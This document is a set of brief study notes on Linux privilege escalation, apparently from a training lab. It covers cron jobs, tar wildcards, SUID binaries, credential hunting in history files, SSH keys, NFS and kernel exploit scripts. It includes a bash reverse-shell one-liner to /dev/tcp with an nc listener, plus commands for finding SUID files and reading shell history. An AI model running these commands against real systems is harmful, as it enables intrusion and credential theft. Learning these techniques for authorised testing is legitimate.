# Linux Priv Esc

## Cron Jobs

```

if programs/scripts in /etc/crontab perms are misconfigured, a shell can be created
can access this through netcat

#!/bin/bash
bash -i >& /dev/tcp/$IP/4444 0>&1</p>

have nc listen on tcp port 4444
nc -nvlp 4444

can manipulate PATH variable to execute cron jobs with poor perms

```

### Cron Jobs - Wildcards
```

abuse tar to execute reverse tcp shell
* in the tar cron job will execute anything inside the /home/user directory
can use msfvenom to create reverse tcp shell to accomplish this

```

## SUID/SGID Executables

### Known Exploits

can use this script to find all the SUID/SGIF executables on the machine:
```

find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null

```

## Passwords and Keys

### History Files

```

if a user accidentally types their password in the CLI, it might get logged by a history file

>cat ~/.*history | less

user has tried to connect to a mysql server but forgot a space

>mysql -h somehost.local -uroot -ppassword123

```

### Config Files

```

config files often contain passwords

look for and read config files incase of this

```

### SSH Keys

```

sometimes user store ssh keys with weak perms which means we can copy them and access them

look for hidden directory /.ssh

```

## NFS

```

if root squashing is enabled, id is set to nobody user

means we can make an NFS share and upload to the target

```

## Kernel Exploits

```

can use scripts to find potential kernel exploits, should only be used as a last resort

perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl

```
